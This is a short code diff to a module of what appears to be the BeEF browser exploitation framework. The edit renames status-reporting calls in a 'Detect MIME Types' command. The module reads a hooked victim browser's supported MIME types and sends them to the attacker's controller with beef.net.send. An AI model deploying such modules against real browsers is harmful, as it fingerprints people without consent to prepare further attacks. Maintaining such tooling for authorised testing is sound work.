@@ -8,11 +8,11 @@ beef.execute(function() {
 
   if (navigator.mimeTypes) {
     var mime_types = JSON.stringify(navigator.mimeTypes);
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "mime_types=" + mime_types, beef.are.status_success());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "mime_types=" + mime_types, beef.status.success());
     beef.debug("[Detect MIME Types] " + mime_types);
   } else {
     beef.debug("[Detect MIME Types] Could not retrieve supported MIME types");
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=Could not retrieve supported MIME types', beef.are.status_error());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=Could not retrieve supported MIME types', beef.status.error());
   }
 
 });
